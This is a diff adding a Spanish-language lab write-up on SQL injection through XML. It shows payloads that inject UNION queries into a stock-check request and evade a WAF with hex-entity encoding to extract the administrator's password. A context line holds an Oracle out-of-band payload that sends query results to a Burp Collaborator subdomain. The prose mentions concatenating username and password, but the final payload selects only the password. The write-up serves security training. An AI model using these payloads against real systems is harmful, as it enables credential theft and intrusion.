@@ -818,6 +818,62 @@ teniendo en cuenta que hay que URL encodear los caracteres, por ejemplo para ORA
 ```
 SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
 ```
+## Reto 18: Inyección SQL con omisión de filtros mediante codificación XML
+Este laboratorio presenta una vulnerabilidad de inyección SQL en su función de verificación de stock. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que se puede usar un ataque UNION para recuperar datos de otras tablas.
+
+La base de datos contiene una users Tabla que contiene los nombres de usuario y las contraseñas de los usuarios registrados. Para resolver el laboratorio, realice un ataque de inyección SQL para recuperar las credenciales del usuario administrador y luego inicie sesión en su cuenta. 
+
+Como se recibe datos en formato XML. La clave está en el parámetro ‘storeId‘, donde se inyectan instrucciones SQL directamente dentro del cuerpo XML de una petición POST.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>1</productId>
+        <storeId>
+            1 order by 1
+        </storeId>
+    </stockCheck>
+```
+
+
+Inicialmente identificamos que el valor de ‘storeId‘ es evaluado por el backend, permitiendo realizar operaciones como ‘1+1‘. Luego intentamos una inyección clásica mediante ‘UNION SELECT‘, pero la aplicación bloquea el intento, presumiblemente por un sistema WAF (Web Application Firewall).
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>1</productId>
+        <storeId>
+            1 union select 1
+        </storeId>
+    </stockCheck>
+```
+
+
+Para evadir este filtro, aplicamos codificación de entidades XML (por ejemplo, hexadecimal o decimal), utilizando herramientas como la extensión Hackvertor en Burp Suite. Este bypass permite que el payload pase desapercibido y sea ejecutado por el backend.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>1</productId>
+        <storeId>
+            <@hex_entities>
+            1 union select 1
+            </@hex_entities>
+        </storeId>
+    </stockCheck>
+```
+
+A través de prueba y error, determinamos que la consulta original solo permite devolver una columna, por lo que concatenamos ‘username‘ y ‘password‘ con un separador (~) para extraer los datos de la tabla ‘users‘ en una sola columna.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>1</productId>
+        <storeId>
+            <@hex_entities>
+            1 union select password from users where username='administrator'
+            </@hex_entities>
+        </storeId>
+    </stockCheck>
+```
+
+Finalmente, utilizamos las credenciales obtenidas para iniciar sesión como ‘administrator‘ y resolver el laboratorio.
 
 
 ## ¿Qué es una SQLI ?
